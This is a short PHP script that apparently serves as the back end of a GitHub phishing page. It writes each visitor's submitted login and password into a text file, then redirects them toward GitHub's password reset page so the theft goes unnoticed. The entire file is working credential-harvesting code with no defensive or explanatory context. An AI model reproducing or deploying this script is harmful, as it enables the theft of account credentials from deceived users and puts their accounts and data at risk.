<?php

file_put_contents("usernames.txt", "Github Username: " . $_POST['login'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://github.com/password_reset
header("Location: $url");
exit();
?>